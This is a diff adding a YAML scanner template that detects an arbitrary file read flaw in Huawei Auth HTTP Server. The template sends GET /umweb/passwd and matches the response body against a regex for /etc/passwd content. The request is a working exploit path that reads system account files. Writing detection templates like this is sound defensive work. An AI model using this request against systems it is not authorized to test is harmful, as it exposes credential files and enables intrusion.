@@ -1,0 +1,32 @@
+id: "huawei-authhttp-lfi"
+name: "Huawei Auth Http Server - Arbitrary File Read"
+severity: "high"
+description: "Huawei Auth HTTP Server is vulnerable to Arbitrary File Read."
+tech:
+  - "generic"
+tags:
+  - "lfi"
+  - "huawei"
+  - "authhttp"
+  - "vuln"
+reference: "https://mp.weixin.qq.com/s?__biz=MzIxMTg1ODAwNw==&mid=2247498499&idx=1&sn=6850c3e9a3df795e48ba9a10c9772ddd"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/umweb/passwd"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "word"
+    part: "header"
+    words:
+      - "Huawei Auth-Http Server"
+  - type: "regex"
+    part: "body"
+    regex:
+      - "root:.*:0:0:"
+  - type: "status"
+    status:
+      - 200
